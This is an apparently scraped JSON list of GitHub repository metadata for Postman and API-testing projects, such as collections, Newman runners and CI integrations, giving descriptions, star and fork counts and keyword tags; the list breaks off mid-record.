[{"user":"hkamel","repo":"azuredevops-postman-collections","pulled":"User","id":178725177,"name":"azuredevops-postman-collections","full_name":"hkamel/azuredevops-postman-collections","description":"The collections allows you to test common Azure DevOps Rest APIs from within Postman.","fork":false,"created_at":"2019-03-31T18:18:10Z","updated_at":"2020-03-24T10:02:45Z","forks":35,"open_issues":3,"watchers":126,"network_count":35,"subscribers_count":7,"owner_id":5002831,"owner_login":"hkamel","owner_avatar_url":"https://avatars1.githubusercontent.com/u/5002831?v=4","owner_type":"User","tags":["test","collect","collection","collections","allows","within","common"]},{"user":"JamesMessinger","repo":"postman-bdd","pulled":"User","id":50974646,"name":"postman-bdd","full_name":"JamesMessinger/postman-bdd","description":"A BDD test framework for Postman and Newman","fork":false,"created_at":"2016-02-03T04:47:02Z","updated_at":"2020-02-06T06:45:47Z","forks":22,"open_issues":4,"watchers":133,"network_count":22,"subscribers_count":12,"owner_id":3453903,"owner_login":"JamesMessinger","owner_avatar_url":"https://avatars3.githubusercontent.com/u/3453903?v=4","owner_type":"User","tags":["test","framework"]},{"user":"TableauExamples","repo":"Tableau_Postman","pulled":"Organization","id":20503955,"name":"Tableau_Postman","full_name":"TableauExamples/Tableau_Postman","description":"A Postman collection for testing and learning Tableau Server's REST API.","fork":false,"created_at":"2014-06-04T22:55:37Z","updated_at":"2020-02-20T21:20:31Z","forks":29,"open_issues":2,"watchers":57,"network_count":29,"subscribers_count":16,"owner_id":7797548,"owner_login":"TableauExamples","owner_avatar_url":"https://avatars3.githubusercontent.com/u/7797548?v=4","owner_type":"Organization","tags":["test","collect","collection","testing","learn","learning"]},{"id":104804865,"name":"endpoint-testing-afternoon","full_name":"DevMountain/endpoint-testing-afternoon","description":"An afternoon project to help solidify testing endpoints using Postman. ","fork":false,"created_at":"2017-09-25T21:40:05Z","updated_at":"2019-03-17T00:12:44Z","stargazers_count":4,"watchers_count":4,"forks":204,"watchers":4,"score":1,"owner_id":5432151,"owner_login":"DevMountain","owner_avatar_url":"https://avatars0.githubusercontent.com/u/5432151?v=4","pulled":1,"tags":["test","testing","endpoint","points","help","endpoints","afternoon"]},{"user":"carlowahlstedt","repo":"NewmanPostman_VSTS_Task","pulled":"User","id":109072838,"name":"NewmanPostman_VSTS_Task","full_name":"carlowahlstedt/NewmanPostman_VSTS_Task","description":"A task for Azure DevOps Pipelines to run newman tests.","fork":false,"created_at":"2017-11-01T01:45:59Z","updated_at":"2020-03-10T01:19:44Z","forks":19,"open_issues":13,"watchers":23,"network_count":19,"subscribers_count":2,"owner_id":2687687,"owner_login":"carlowahlstedt","owner_avatar_url":"https://avatars3.githubusercontent.com/u/2687687?v=4","owner_type":"User","tags":["test","tests","newman","line","task","lines"]},{"user":"httprunner","repo":"postman2case","pulled":"Organization","id":129861255,"name":"postman2case","full_name":"httprunner/postman2case","description":"Convert Postman Collection Format to JSON/YAML testcases for HttpRunner.","fork":false,"created_at":"2018-04-17T07:05:51Z","updated_at":"2020-03-06T10:12:05Z","forks":8,"open_issues":3,"watchers":17,"network_count":8,"subscribers_count":6,"owner_id":33365280,"owner_login":"httprunner","owner_avatar_url":"https://avatars0.githubusercontent.com/u/33365280?v=4","owner_type":"Organization","tags":["test","case","cases","testcase"]},{"id":104804742,"name":"endpoint-testing-mini","full_name":"DevMountain/endpoint-testing-mini","description":"A mini project to introduce how to test endpoints using Postman.","fork":false,"created_at":"2017-09-25T21:38:33Z","updated_at":"2019-11-19T02:50:58Z","stargazers_count":2,"watchers_count":2,"forks":287,"watchers":2,"score":1,"owner_id":5432151,"owner_login":"DevMountain","owner_avatar_url":"https://avatars0.githubusercontent.com/u/5432151?v=4","pulled":1,"tags":["test","endpoint","points","endpoints","intro","mini"]},{"user":"fedejousset","repo":"Dynamics365WebApiPostmanCollection","pulled":"User","id":148663809,"name":"Dynamics365WebApiPostmanCollection","full_name":"fedejousset/Dynamics365WebApiPostmanCollection","description":"This is a Postman collection that covers standard API requests for Dynamics 365. The collection aims to help Dynamics 365 Developers/Power Users to create, run and test different types of Web API request by providing authentication and request templates.","fork":false,"created_at":"2018-09-13T16:06:50Z","updated_at":"2020-03-03T09:00:17Z","forks":7,"open_issues":1,"watchers":26,"network_count":7,"subscribers_count":3,"owner_id":20836210,"owner_login":"fedejousset","owner_avatar_url":"https://avatars1.githubusercontent.com/u/20836210?v=4","owner_type":"User","tags":["test","collect","collection","create","request","requests","auth","help","authentication","rent","plate","template","type","types","templates","covers","providing"]},{"id":162043988,"name":"postman-rest-api-testing","full_name":"larrybotha/postman-rest-api-testing","description":"Notes on how to use Postman to test REST APIs","fork":false,"created_at":"2018-12-16T21:48:05Z","updated_at":"2020-02-28T13:26:54Z","stargazers_count":10,"watchers_count":10,"forks":8,"watchers":10,"score":1,"owner_id":1510520,"owner_login":"larrybotha","owner_avatar_url":"https://avatars0.githubusercontent.com/u/1510520?v=4","pulled":1,"tags":["test"]},{"id":133825692,"name":"node_mongo_postman","full_name":"ip11/node_mongo_postman","description":null,"fork":false,"created_at":"2018-05-17T14:31:18Z","updated_at":"2020-01-21T13:37:02Z","stargazers_count":7,"watchers_count":7,"forks":7,"watchers":7,"score":1,"owner_id":39377668,"owner_login":"ip11","owner_avatar_url":"https://avatars0.githubusercontent.com/u/39377668?v=4","pulled":1,"tags":[]},{"id":107799476,"name":"intercom-postman-collection","full_name":"thewheat/intercom-postman-collection","description":"A Postman Collection file for the Intercom API http://developers.intercom.com/reference Includes extraction code to generate the latest version","fork":false,"created_at":"2017-10-21T17:10:11Z","updated_at":"2020-02-04T14:08:51Z","stargazers_count":7,"watchers_count":7,"forks":7,"watchers":7,"score":1,"owner_id":892961,"owner_login":"thewheat","owner_avatar_url":"https://avatars3.githubusercontent.com/u/892961?v=4","pulled":1,"tags":["test","file","http","develop","code","generate","version","developer","action","developers","reference","latest","extract"]},{"user":"Massad","repo":"gin-boilerplate","pulled":"User","id":55397574,"name":"gin-boilerplate","full_name":"Massad/gin-boilerplate","description":"The fastest way to deploy a (skeleton) restful api’s with Golang - Gin Framework with a structured starter project that defaults to PostgreSQL database and Redis as the session storage.","fork":false,"created_at":"2016-04-04T09:00:43Z","updated_at":"2020-03-25T16:43:27Z","forks":65,"open_issues":1,"watchers":384,"network_count":65,"subscribers_count":17,"owner_id":3076722,"owner_login":"Massad","owner_avatar_url":"https://avatars1.githubusercontent.com/u/3076722?v=4","owner_type":"User","tags":["test","data","rest","database","star","restful","start","struct","lang","structure","default","storage","skeleton","starter","fastest"]},{"id":30307231,"name":"brackets-postman","full_name":"dnbard/brackets-postman","description":"Brackets extension to test REST API","fork":false,"created_at":"2015-02-04T16:01:27Z","updated_at":"2017-12-12T12:09:48Z","stargazers_count":17,"watchers_count":17,"forks":3,"watchers":17,"score":1,"owner_id":4028472,"owner_login":"dnbard","owner_avatar_url":"https://avatars1.githubusercontent.com/u/4028472?v=4","pulled":1,"tags":["test","extension"]},{"user":"cameronoxley","repo":"Newman-to-Slack","pulled":"User","id":46280288,"name":"Newman-to-Slack","full_name":"cameronoxley/Newman-to-Slack","description":"Runs a Newman test script and outputs the summary to a Slack webhook","fork":false,"created_at":"2015-11-16T14:38:21Z","updated_at":"2019-05-04T13:20:02Z","forks":10,"open_issues":1,"watchers":17,"network_count":10,"subscribers_count":2,"owner_id":1674847,"owner_login":"cameronoxley","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1674847?v=4","owner_type":"User","tags":["test","script","output","webhook","summary"]},{"user":"walis85300","repo":"postman-course","pulled":"User","id":223619379,"name":"postman-course","full_name":"walis85300/postman-course","description":null,"fork":false,"created_at":"2019-11-23T16:27:46Z","updated_at":"2020-02-25T02:58:28Z","forks":12,"open_issues":1,"watchers":2,"network_count":12,"subscribers_count":1,"owner_id":4245976,"owner_login":"walis85300","owner_avatar_url":"https://avatars3.githubusercontent.com/u/4245976?v=4","owner_type":"User","tags":[]},{"id":70889596,"name":"dakiya","full_name":"rupeshmore/dakiya","description":"Dakiya: converts Postman collections to load testing tool scripts","fork":false,"created_at":"2016-10-14T08:23:38Z","updated_at":"2020-03-31T08:32:55Z","stargazers_count":25,"watchers_count":25,"forks":6,"watchers":25,"score":1,"owner_id":13160174,"owner_login":"rupeshmore","owner_avatar_url":"https://avatars2.githubusercontent.com/u/13160174?v=4","pulled":1,"tags":["test","collect","collection","collections","testing","script","tool","convert","scripts","load","converts"]},{"id":118794778,"name":"cognito-postman-templates","full_name":"src-system42/cognito-postman-templates","description":"Generator for creating Postman collections to test Cognito endpoints.","fork":false,"created_at":"2018-01-24T16:57:59Z","updated_at":"2020-03-12T06:40:52Z","stargazers_count":9,"watchers_count":9,"forks":4,"watchers":9,"score":1,"owner_id":31330309,"owner_login":"src-system42","owner_avatar_url":"https://avatars2.githubusercontent.com/u/31330309?v=4","pulled":1,"tags":["test","collect","collection","collections","endpoint","points","endpoints","creating"]},{"user":"transferwise","repo":"public-api-postman-collection","pulled":"Organization","id":151441541,"name":"public-api-postman-collection","full_name":"transferwise/public-api-postman-collection","description":"A Postman collection for exploring and testing the TransferWise public API","fork":false,"created_at":"2018-10-03T16:08:48Z","updated_at":"2020-03-12T10:54:48Z","forks":3,"open_issues":2,"watchers":13,"network_count":3,"subscribers_count":12,"owner_id":9465219,"owner_login":"transferwise","owner_avatar_url":"https://avatars3.githubusercontent.com/u/9465219?v=4","owner_type":"Organization","tags":["test","collect","collection","testing","public","exploring"]},{"user":"jorgecotillo","repo":"aspnet_core_identity_server_4_postman","pulled":"User","id":95179869,"name":"aspnet_core_identity_server_4_postman","full_name":"jorgecotillo/aspnet_core_identity_server_4_postman","description":"Sample applications that demonstrates the configuration of your WebApi and IdentityServer4 to test your API from Postman","fork":false,"created_at":"2017-06-23T03:30:57Z","updated_at":"2020-03-06T23:06:45Z","forks":6,"open_issues":1,"watchers":6,"network_count":6,"subscribers_count":1,"owner_id":6723000,"owner_login":"jorgecotillo","owner_avatar_url":"https://avatars0.githubusercontent.com/u/6723000?v=4","owner_type":"User","tags":["test","application","demo","config","configuration","applications","demonstrate","entity","demonstrates"]},{"user":"srinivasbv22","repo":"postmanemployeeproject","pulled":"User","id":163518223,"name":"postmanemployeeproject","full_name":"srinivasbv22/postmanemployeeproject","description":null,"fork":false,"created_at":"2018-12-29T14:42:20Z","updated_at":"2019-01-01T05:01:48Z","forks":6,"open_issues":0,"watchers":0,"network_count":6,"subscribers_count":0,"owner_id":45447713,"owner_login":"srinivasbv22","owner_avatar_url":"https://avatars1.githubusercontent.com/u/45447713?v=4","owner_type":"User","tags":[]},{"user":"txthinking","repo":"frank","pulled":"User","id":109979004,"name":"frank","full_name":"txthinking/frank","description":"Frank is a REST API automated testing tool like Postman but in command line. Auto generate markdown API document.","fork":false,"created_at":"2017-11-08T13:24:43Z","updated_at":"2020-02-28T15:40:48Z","forks":10,"open_issues":3,"watchers":69,"network_count":10,"subscribers_count":4,"owner_id":1241807,"owner_login":"txthinking","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1241807?v=4","owner_type":"User","tags":["test","testing","tool","document","auto","automat","line","generate","command","automate","automated","command line","markdown"]},{"user":"duyn9uyen","repo":"postman-jenkins-demo","pulled":"User","id":113126861,"name":"postman-jenkins-demo","full_name":"duyn9uyen/postman-jenkins-demo","description":"A demo project on running Postman API tests with Newman on a Jenkins build server","fork":false,"created_at":"2017-12-05T03:24:38Z","updated_at":"2018-10-04T10:20:27Z","forks":6,"open_issues":0,"watchers":2,"network_count":6,"subscribers_count":1,"owner_id":6518508,"owner_login":"duyn9uyen","owner_avatar_url":"https://avatars0.githubusercontent.com/u/6518508?v=4","owner_type":"User","tags":["test","tests","server","tests ","build","demo","running"]},{"user":"jivanim","repo":"cs122b-tests","pulled":"User","id":182436341,"name":"cs122b-tests","full_name":"jivanim/cs122b-tests","description":"Postman (newman) test scripts for HWs ","fork":false,"created_at":"2019-04-20T17:39:59Z","updated_at":"2019-09-29T00:04:30Z","forks":8,"open_issues":0,"watchers":0,"network_count":8,"subscribers_count":0,"owner_id":28543183,"owner_login":"jivanim","owner_avatar_url":"https://avatars0.githubusercontent.com/u/28543183?v=4","owner_type":"User","tags":["test","script","newman","scripts"]},{"user":"wojciech-zurek","repo":"newman-ci","pulled":"User","id":126441832,"name":"newman-ci","full_name":"wojciech-zurek/newman-ci","description":"Run Newman/Postman tests in gitlab-ci","fork":false,"created_at":"2018-03-23T06:19:23Z","updated_at":"2020-03-02T16:41:30Z","forks":3,"open_issues":0,"watchers":10,"network_count":3,"subscribers_count":2,"owner_id":622981,"owner_login":"wojciech-zurek","owner_avatar_url":"https://avatars1.githubusercontent.com/u/622981?v=4","owner_type":"User","tags":["test","tests","tests ","gitlab"]},{"user":"vdespa","repo":"httpbin-postman-tests","pulled":"User","id":136367127,"name":"httpbin-postman-tests","full_name":"vdespa/httpbin-postman-tests","description":"Postman collection and tests","fork":false,"created_at":"2018-06-06T18:02:15Z","updated_at":"2019-11-05T14:21:57Z","forks":6,"open_issues":0,"watchers":3,"network_count":6,"subscribers_count":2,"owner_id":1197635,"owner_login":"vdespa","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1197635?v=4","owner_type":"User","tags":["test","collect","collection","tests"]},{"user":"flyworker","repo":"python-automation-testing","pulled":"User","id":114945463,"name":"python-automation-testing","full_name":"flyworker/python-automation-testing","description":"Learn about automated software testing with Python, Selenium WebDriver, and API, Postman, focusing on web applications.","fork":false,"created_at":"2017-12-21T00:53:26Z","updated_at":"2019-12-13T04:43:38Z","forks":12,"open_issues":0,"watchers":3,"network_count":12,"subscribers_count":1,"owner_id":8363795,"owner_login":"flyworker","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8363795?v=4","owner_type":"User","tags":["test","testing","application","auto","automat","automate","web app","automated","applications","software","river"]},{"user":"sendwyre","repo":"wyre-postman-collection","pulled":"Organization","id":183311400,"name":"wyre-postman-collection","full_name":"sendwyre/wyre-postman-collection","description":"This repo is filled to the brim with sample Postman API requests that allow you to test our back-end endpoints.","fork":false,"created_at":"2019-04-24T21:46:31Z","updated_at":"2019-12-17T23:07:15Z","forks":6,"open_issues":0,"watchers":3,"network_count":6,"subscribers_count":3,"owner_id":6931243,"owner_login":"sendwyre","owner_avatar_url":"https://avatars2.githubusercontent.com/u/6931243?v=4","owner_type":"Organization","tags":["test","repo","request","requests","endpoint","points","sample","endpoints","filled"]},{"user":"Mgutjahr","repo":"serverless-newman","pulled":"User","id":116392905,"name":"serverless-newman","full_name":"Mgutjahr/serverless-newman","description":"Execute newman (postman) test on AWS lambda","fork":false,"created_at":"2018-01-05T14:23:18Z","updated_at":"2020-02-17T03:56:10Z","forks":2,"open_issues":0,"watchers":9,"network_count":2,"subscribers_count":2,"owner_id":3747922,"owner_login":"Mgutjahr","owner_avatar_url":"https://avatars2.githubusercontent.com/u/3747922?v=4","owner_type":"User","tags":["test","newman","lambda"]},{"user":"theScimus","repo":"postman_to_jmeter_converter","pulled":"User","id":98522484,"name":"postman_to_jmeter_converter","full_name":"theScimus/postman_to_jmeter_converter","description":"A small script that converts postman tests into JMeter load tests","fork":false,"created_at":"2017-07-27T10:13:01Z","updated_at":"2019-03-08T00:53:07Z","forks":3,"open_issues":0,"watchers":3,"network_count":3,"subscribers_count":1,"owner_id":30462947,"owner_login":"theScimus","owner_avatar_url":"https://avatars0.githubusercontent.com/u/30462947?v=4","owner_type":"User","tags":["test"," postman","tests","script","tests ","convert","load","postman tests","small","converts"]},{"user":"smartive","repo":"techtalk-integration-tests-postman","pulled":"Organization","id":49441118,"name":"techtalk-integration-tests-postman","full_name":"smartive/techtalk-integration-tests-postman","description":"Small demo-api to show (automated) integration tests with postman and newman","fork":false,"created_at":"2016-01-11T17:06:06Z","updated_at":"2018-04-06T09:30:00Z","forks":3,"open_issues":0,"watchers":2,"network_count":3,"subscribers_count":3,"owner_id":2870077,"owner_login":"smartive","owner_avatar_url":"https://avatars3.githubusercontent.com/u/2870077?v=4","owner_type":"Organization","tags":["test"," postman","tests","tests ","auto","automat","newman","demo","integration","automate","automated"]},{"user":"eridem","repo":"vscode-postman","pulled":"User","id":71722698,"name":"vscode-postman","full_name":"eridem/vscode-postman","description":"🏳️ Run Postman tests directly from your VSCode","fork":false,"created_at":"2016-10-23T18:54:11Z","updated_at":"2020-01-20T11:16:39Z","forks":0,"open_issues":3,"watchers":17,"network_count":0,"subscribers_count":1,"owner_id":436978,"owner_login":"eridem","owner_avatar_url":"https://avatars1.githubusercontent.com/u/436978?v=4","owner_type":"User","tags":["test","tests","tests ","directly"]},{"user":"bilgetech","repo":"postaci","pulled":"Organization","id":117068413,"name":"postaci","full_name":"bilgetech/postaci","description":"Continuous test runner for Postman.","fork":false,"created_at":"2018-01-11T07:55:50Z","updated_at":"2018-05-11T06:58:15Z","forks":2,"open_issues":1,"watchers":3,"network_count":2,"subscribers_count":4,"owner_id":33055402,"owner_login":"bilgetech","owner_avatar_url":"https://avatars1.githubusercontent.com/u/33055402?v=4","owner_type":"Organization","tags":["test","runner","test run"]},{"user":"nandymandy1","repo":"role_based_authentication_With-MEN","pulled":"User","id":174181931,"name":"role_based_authentication_With-MEN","full_name":"nandymandy1/role_based_authentication_With-MEN","description":"In this repository I have created simple role based authentication using Node.js express mongodb and tested with Postman.","fork":false,"created_at":"2019-03-06T16:35:33Z","updated_at":"2020-03-17T19:34:48Z","forks":6,"open_issues":0,"watchers":14,"network_count":6,"subscribers_count":1,"owner_id":29309671,"owner_login":"nandymandy1","owner_avatar_url":"https://avatars0.githubusercontent.com/u/29309671?v=4","owner_type":"User","tags":["test","create","repo","repos","repository","based","express","mongo"," express","auth","tested","authentication","mongod","mongodb","role"]},{"user":"open-source-labs","repo":"Swell","pulled":"Organization","id":157299107,"name":"Swell","full_name":"open-source-labs/Swell","description":"Swell: API development tool that enables developers to test endpoints served over streaming technologies including Server-Sent Events (SSE), WebSockets, HTTP2, GraphQL, and gRPC.","fork":false,"created_at":"2018-11-13T01:01:39Z","updated_at":"2020-03-21T21:22:08Z","forks":19,"open_issues":6,"watchers":292,"network_count":19,"subscribers_count":14,"owner_id":49530926,"owner_login":"open-source-labs","owner_avatar_url":"https://avatars3.githubusercontent.com/u/49530926?v=4","owner_type":"Organization","tags":["test","tool","develop","endpoint","points","endpoints","development","developer","tech","developers","including","enable","enables","technologies","streaming","served"]},{"user":"flash286","repo":"postman-load-testing","pulled":"User","id":111469848,"name":"postman-load-testing","full_name":"flash286/postman-load-testing","description":"This tool written on go lang, help to run postman collections in parallel mode. So you can use it for load testing based on postman collections.  As a runner it uses newman.","fork":false,"created_at":"2017-11-20T22:31:02Z","updated_at":"2019-12-22T10:04:47Z","forks":1,"open_issues":0,"watchers":10,"network_count":1,"subscribers_count":3,"owner_id":1481022,"owner_login":"flash286","owner_avatar_url":"https://avatars0.githubusercontent.com/u/1481022?v=4","owner_type":"User","tags":["test"," postman","collect","collection","collections","testing","postman collection","tool","based","newman","help","postman collections","load","runner","written","uses","lang","parallel"]},{"user":"AndriiStepura","repo":"letslearnapitesting","pulled":"User","id":106154551,"name":"letslearnapitesting","full_name":"AndriiStepura/letslearnapitesting","description":"Repo for API testing presentation, based with postman tools","fork":false,"created_at":"2017-10-08T06:18:19Z","updated_at":"2019-05-22T21:14:47Z","forks":2,"open_issues":0,"watchers":4,"network_count":2,"subscribers_count":2,"owner_id":30338636,"owner_login":"AndriiStepura","owner_avatar_url":"https://avatars3.githubusercontent.com/u/30338636?v=4","owner_type":"User","tags":["test"," postman","testing","tool","based","tools","presentation"]},{"user":"cohix","repo":"gopherman","pulled":"User","id":182854150,"name":"gopherman","full_name":"cohix/gopherman","description":"Utility library for creating and running tests using the Postman collection format","fork":false,"created_at":"2019-04-22T19:28:50Z","updated_at":"2019-09-03T10:36:54Z","forks":3,"open_issues":0,"watchers":4,"network_count":3,"subscribers_count":1,"owner_id":5942370,"owner_login":"cohix","owner_avatar_url":"https://avatars3.githubusercontent.com/u/5942370?v=4","owner_type":"User","tags":["test","collect","collection","form","tests","tests ","format","running","library","creating"]},{"user":"Thirumurugan19","repo":"newman-circleci","pulled":"User","id":124871209,"name":"newman-circleci","full_name":"Thirumurugan19/newman-circleci","description":"Integrate API tests with Postman, Newman, and CircleCI","fork":false,"created_at":"2018-03-12T10:19:17Z","updated_at":"2019-12-28T08:46:24Z","forks":3,"open_issues":0,"watchers":3,"network_count":3,"subscribers_count":1,"owner_id":3726770,"owner_login":"Thirumurugan19","owner_avatar_url":"https://avatars0.githubusercontent.com/u/3726770?v=4","owner_type":"User","tags":["test","tests","tests "]},{"user":"EhsanTang","repo":"ApiDebug","pulled":"User","id":91162919,"name":"ApiDebug","full_name":"EhsanTang/ApiDebug","description":"浏览器API接口调试插件，Chrome接口调试工具，http调试，post调试，post模拟工具，postman，post接口调试，post测试插件-ApiDebug is a browser plug-in for testing RESTful web services. http://api.crap.cn","fork":false,"created_at":"2017-05-13T09:18:26Z","updated_at":"2020-03-24T09:58:07Z","forks":36,"open_issues":1,"watchers":115,"network_count":36,"subscribers_count":15,"owner_id":5117567,"owner_login":"EhsanTang","owner_avatar_url":"https://avatars3.githubusercontent.com/u/5117567?v=4","owner_type":"User","tags":["test","testing","service","http","services","browser"]},{"user":"JamesMessinger","repo":"super-powered-api-testing","pulled":"User","id":108252632,"name":"super-powered-api-testing","full_name":"JamesMessinger/super-powered-api-testing","description":"Comparisons of powerful API testing tools","fork":false,"created_at":"2017-10-25T10:04:57Z","updated_at":"2019-11-05T05:43:24Z","forks":19,"open_issues":0,"watchers":19,"network_count":19,"subscribers_count":6,"owner_id":3453903,"owner_login":"JamesMessinger","owner_avatar_url":"https://avatars3.githubusercontent.com/u/3453903?v=4","owner_type":"User","tags":["test","testing","tool","tools","powerful"]},{"user":"DIPSAS","repo":"EhrStore.Postman","pulled":"Organization","id":175819935,"name":"EhrStore.Postman","full_name":"DIPSAS/EhrStore.Postman","description":"Some postman scripts to test and verify the features of an openEHR server ","fork":false,"created_at":"2019-03-15T12:54:01Z","updated_at":"2020-02-14T09:06:48Z","forks":1,"open_issues":1,"watchers":5,"network_count":1,"subscribers_count":3,"owner_id":10976610,"owner_login":"DIPSAS","owner_avatar_url":"https://avatars0.githubusercontent.com/u/10976610?v=4","owner_type":"Organization","tags":["test"," postman","script","server","scripts","open","feature","features","postman scripts","verify"]},{"user":"andreasmmadjiah","repo":"REST-API-testing","pulled":"User","id":210318026,"name":"REST-API-testing","full_name":"andreasmmadjiah/REST-API-testing","description":"Simple API testing using pythonanywhere and postman","fork":false,"created_at":"2019-09-23T09:39:40Z","updated_at":"2019-09-23T16:24:51Z","forks":0,"open_issues":0,"watchers":5,"network_count":0,"subscribers_count":1,"owner_id":54434214,"owner_login":"andreasmmadjiah","owner_avatar_url":"https://avatars3.githubusercontent.com/u/54434214?v=4","owner_type":"User","tags":["test"," postman","testing","python","pythonanywhere"]},{"user":"Software-On-The-Road","repo":"Postman-AutoTestAPI","pulled":"Organization","id":145468787,"name":"Postman-AutoTestAPI","full_name":"Software-On-The-Road/Postman-AutoTestAPI","description":"Generate simple unit tests from JSONs for Postman collections","fork":false,"created_at":"2018-08-20T20:45:42Z","updated_at":"2020-01-22T16:49:38Z","forks":0,"open_issues":0,"watchers":4,"network_count":0,"subscribers_count":1,"owner_id":56113610,"owner_login":"Software-On-The-Road","owner_avatar_url":"https://avatars2.githubusercontent.com/u/56113610?v=4","owner_type":"Organization","tags":["test","collect","collection","collections","tests","tests ","unit"]},{"user":"umer-ali-khan","repo":"mapbox-postman-collections","pulled":"User","id":143961697,"name":"mapbox-postman-collections","full_name":"umer-ali-khan/mapbox-postman-collections","description":null,"fork":false,"created_at":"2018-08-08T04:38:45Z","updated_at":"2020-02-19T21:51:02Z","forks":1,"open_issues":0,"watchers":4,"network_count":1,"subscribers_count":1,"owner_id":7586760,"owner_login":"umer-ali-khan","owner_avatar_url":"https://avatars0.githubusercontent.com/u/7586760?v=4","owner_type":"User","tags":[]},{"user":"microcks","repo":"microcks-postman-runtime","pulled":"Organization","id":99351387,"name":"microcks-postman-runtime","full_name":"microcks/microcks-postman-runtime","description":"A bridge for running Postman tests from HTTP interface","fork":false,"created_at":"2017-08-04T14:34:30Z","updated_at":"2019-03-04T17:10:54Z","forks":0,"open_issues":2,"watchers":4,"network_count":0,"subscribers_count":2,"owner_id":11051048,"owner_login":"microcks","owner_avatar_url":"https://avatars1.githubusercontent.com/u/11051048?v=4","owner_type":"Organization","tags":["test","tests","tests ","running","face","interface","bridge"]},{"user":"easy-ware","repo":"api-manager","pulled":"Organization","id":124471558,"name":"api-manager","full_name":"easy-ware/api-manager","description":"Help front-end and back-end devolopers to work with APIs faster and easier. features: API define, mock, test, document. like postman, rap.  API接口管理平台，支持接口实际和mock测试","fork":false,"created_at":"2018-03-09T01:45:49Z","updated_at":"2019-12-29T08:50:31Z","forks":7,"open_issues":5,"watchers":15,"network_count":7,"subscribers_count":4,"owner_id":35788760,"owner_login":"easy-ware","owner_avatar_url":"https://avatars1.githubusercontent.com/u/35788760?v=4","owner_type":"Organization","tags":["test"," postman","document","front","mock","feature","features","easier","define","devolopers"]},{"user":"TheEvilDev","repo":"hapi-postman","pulled":"User","id":30686163,"name":"hapi-postman","full_name":"TheEvilDev/hapi-postman","description":"Hapi plugin that exposes endpoint meta data as a postman collection for easy testing.","fork":false,"created_at":"2015-02-12T04:48:54Z","updated_at":"2019-01-28T18:16:35Z","forks":1,"open_issues":0,"watchers":3,"network_count":1,"subscribers_count":2,"owner_id":689065,"owner_login":"TheEvilDev","owner_avatar_url":"https://avatars2.githubusercontent.com/u/689065?v=4","owner_type":"User","tags":["test"," postman","collect","collection","data","testing","postman collection","endpoint","plugin","expose","exposes"]},{"user":"paigemoody","repo":"postman-paths","pulled":"User","id":186474764,"name":"postman-paths","full_name":"paigemoody/postman-paths","description":"Shortest path web app for community organizers. Live at: http://www.weavewalk.me","fork":false,"created_at":"2019-05-13T18:30:55Z","updated_at":"2019-09-04T17:46:54Z","forks":0,"open_issues":0,"watchers":3,"network_count":0,"subscribers_count":0,"owner_id":25571355,"owner_login":"paigemoody","owner_avatar_url":"https://avatars0.githubusercontent.com/u/25571355?v=4","owner_type":"User","tags":["test","http","web app","unit","path","unity"]},{"user":"johnlonganecker","repo":"consul-postman","pulled":"User","id":90326003,"name":"consul-postman","full_name":"johnlonganecker/consul-postman","description":null,"fork":false,"created_at":"2017-05-05T01:46:07Z","updated_at":"2017-09-19T15:21:14Z","forks":1,"open_issues":0,"watchers":3,"network_count":1,"subscribers_count":0,"owner_id":587052,"owner_login":"johnlonganecker","owner_avatar_url":"https://avatars1.githubusercontent.com/u/587052?v=4","owner_type":"User","tags":[]},{"user":"tutagomes","repo":"Postman-Testing","pulled":"User","id":161397888,"name":"Postman-Testing","full_name":"tutagomes/Postman-Testing","description":"A repository to store some data and testing scripts used by my tutorial about postman testing.","fork":false,"created_at":"2018-12-11T21:47:16Z","updated_at":"2020-03-24T22:53:24Z","forks":1,"open_issues":0,"watchers":3,"network_count":1,"subscribers_count":2,"owner_id":7077493,"owner_login":"tutagomes","owner_avatar_url":"https://avatars3.githubusercontent.com/u/7077493?v=4","owner_type":"User","tags":["test"," postman","repo","data","testing","repos","repository","script","scripts","store","tutorial"]},{"user":"SalahEddin","repo":"pman","pulled":"User","id":209098019,"name":"pman","full_name":"SalahEddin/pman","description":"package to create postman test collections without Postman GUI","fork":false,"created_at":"2019-09-17T16:02:04Z","updated_at":"2019-09-18T15:53:10Z","forks":0,"open_issues":7,"watchers":2,"network_count":0,"subscribers_count":1,"owner_id":7818090,"owner_login":"SalahEddin","owner_avatar_url":"https://avatars2.githubusercontent.com/u/7818090?v=4","owner_type":"User","tags":["test"," postman","collect","collection","collections","create","package"]},{"user":"Earthport","repo":"rest-api-postman","pulled":"Organization","id":148662512,"name":"rest-api-postman","full_name":"Earthport/rest-api-postman","description":"This repository contains Postman collections to help Earthport clients test their integration into Earthport's APIs","fork":false,"created_at":"2018-09-13T15:56:25Z","updated_at":"2019-10-16T12:55:10Z","forks":0,"open_issues":0,"watchers":3,"network_count":0,"subscribers_count":1,"owner_id":40466066,"owner_login":"Earthport","owner_avatar_url":"https://avatars1.githubusercontent.com/u/40466066?v=4","owner_type":"Organization","tags":["test","collect","collection","collections","repo","repos","repository","client","contain","help","integration","clients"]},{"user":"arfaram","repo":"ezplatform_rest_api_postman","pulled":"User","id":178227430,"name":"ezplatform_rest_api_postman","full_name":"arfaram/ezplatform_rest_api_postman","description":null,"fork":false,"created_at":"2019-03-28T15:05:49Z","updated_at":"2020-01-26T10:22:54Z","forks":0,"open_issues":0,"watchers":3,"network_count":0,"subscribers_count":2,"owner_id":793247,"owner_login":"arfaram","owner_avatar_url":"https://avatars1.githubusercontent.com/u/793247?v=4","owner_type":"User","tags":[]},{"user":"evmon","repo":"autotests","pulled":"User","id":73704980,"name":"autotests","full_name":"evmon/autotests","description":"Autotest for Postman collections","fork":false,"created_at":"2016-11-14T13:01:17Z","updated_at":"2019-11-14T12:04:11Z","forks":1,"open_issues":0,"watchers":2,"network_count":1,"subscribers_count":1,"owner_id":20344313,"owner_login":"evmon","owner_avatar_url":"https://avatars2.githubusercontent.com/u/20344313?v=4","owner_type":"User","tags":["test","collect","collection","collections"]},{"user":"moedelo","repo":"api-examples","pulled":"Organization","id":66082112,"name":"api-examples","full_name":"moedelo/api-examples","description":"test postman collections for moedelo api","fork":false,"created_at":"2016-08-19T12:51:56Z","updated_at":"2018-02-06T21:14:31Z","forks":0,"open_issues":0,"watchers":3,"network_count":0,"subscribers_count":5,"owner_id":10271089,"owner_login":"moedelo","owner_avatar_url":"https://avatars1.githubusercontent.com/u/10271089?v=4","owner_type":"Organization","tags":["test"," postman","collect","collection","collections","postman collection","postman 